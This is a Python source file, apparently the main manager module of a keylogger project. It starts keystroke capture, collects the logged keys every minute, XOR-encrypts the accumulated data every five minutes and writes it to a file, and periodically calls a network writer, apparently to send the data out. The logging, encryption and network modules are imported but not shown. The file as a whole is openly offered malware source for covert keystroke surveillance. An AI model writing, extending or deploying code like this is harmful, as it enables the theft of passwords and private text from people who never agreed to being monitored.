from time import sleep
from keyLogger import *
from writer import *
from encryptor import *

class Manager:
    """Manager class for the KeyLogger,
    handling the writing and encryption of keystrokes."""

    def __init__(self):
        """Initialize the Manager with a KeyLogger instance and start logging."""
        self.l = KeyLogger()
        self.l.start_logging()

    def activity(self):
        """Perform the KeyLogging activity,
        writing data to a dictionary and file, and encrypting it periodically."""
        minute = 60
        send_encryption = 5
        reset = 15
        dw = DictWriter()
        fw = FileWriter()
        nw = NetworkWriter()
        count = 0
        while True:
            # Wait for a minute
            sleep(minute)
            count += 1
            # Get the list of logged keys
            get_list = self.l.get_logged_keys()
            print(get_list)
            # Write the list of characters to the dictionary writer
            if get_list:
                dw.write(get_list)
            # Every 5 minutes, encrypt and write the dictionary to a file
            if count % send_encryption == 0:
                # Get the dictionary from the dictionary writer
                get_dict = dw.get_dict()
                # print(get_dict)
                # Encrypt the dictionary
                if get_dict:
                    dict_encrypt = XorEncryptor().encrypt(get_dict)
                    # print(dict_encrypt)
                    # Write the encrypted dictionary to the file
                    print(str(get_dict))
                    fw.write(dict_encrypt)
                if count >= reset:
                    nw.write("aaa")
                    count = 0



if __name__ == "__main__":
    Manager().activity()